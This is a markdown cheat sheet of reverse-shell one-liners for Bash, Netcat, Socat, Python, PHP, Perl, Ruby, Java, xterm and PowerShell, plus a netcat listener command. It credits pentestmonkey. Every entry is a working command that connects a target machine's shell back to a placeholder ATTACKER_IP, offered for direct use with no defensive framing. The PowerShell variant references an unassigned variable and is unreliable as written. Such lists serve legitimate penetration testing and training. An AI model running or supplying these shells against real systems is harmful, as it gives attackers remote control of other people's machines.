# Reverse Shell Cheat Sheet

A collection of reverse shell one-liners for various languages and tools.  
**Replace `ATTACKER_IP` and `PORT` with your listener's IP and port.**

---

## Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```
- If it doesn't work try with ```bash -c "bash -i ..."```


```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

---

## Netcat

### Traditional Netcat

```bash
nc -e /bin/sh ATTACKER_IP PORT
```

### Netcat (if -e is not supported)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

---

## Socat

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

---

## Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

---

## PHP

```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Perl

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## xterm

```bash
xterm -display ATTACKER_IP:1
```
*(Requires X server on the attacker's machine. Start with: `Xnest :1` or `Xephyr :1`)*

---

## PowerShell (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

---

## Notes

- Start a listener on your machine before running any reverse shell:
    ```bash
    nc -lvnp PORT
    ```
- Some shells may require `sudo` or specific privileges.
- If a command doesn't work, try another variant or language.


## Credits

- Many of these one-liners are adapted from:  
  [pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)